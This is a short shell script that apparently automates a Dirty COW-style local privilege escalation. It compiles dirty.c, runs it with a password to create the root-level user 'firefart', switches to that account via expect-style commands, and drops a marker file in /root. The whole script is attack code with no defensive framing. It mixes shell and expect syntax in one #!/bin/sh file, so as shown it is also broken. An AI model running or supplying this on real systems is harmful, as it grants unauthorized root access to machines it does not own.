#!/bin/sh
gcc -pthread dirty.c -o dirty -lcrypt
./dirty zhy4567
spawn su firefart
expect ":"
send "zhy4567\n"
interact
cd /root
touch success
